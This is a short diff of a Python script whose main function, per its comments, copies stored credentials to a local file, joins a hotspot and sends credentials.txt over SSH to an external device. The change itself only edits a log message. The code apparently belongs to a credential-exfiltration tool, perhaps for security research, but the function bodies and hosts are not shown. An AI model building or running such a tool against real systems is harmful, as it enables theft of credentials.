@@ -47,7 +47,7 @@ def main():
     credentialsLocalFile() # make a local copy of credentials
     print("STARTING SECOND CONNECTION")
     connectInternet() # connect to hotspot to exfiltrate local file
-    print("EXFILTRATING FILE TO EXTERNAL")
+    print("EXFILTRATING FILE TO EXTERNAL DEVICE")
     exfiltrateFile() # SSH'ing to external device inside of network and transfering credentials.txt file
 
 if __name__=="__main__":
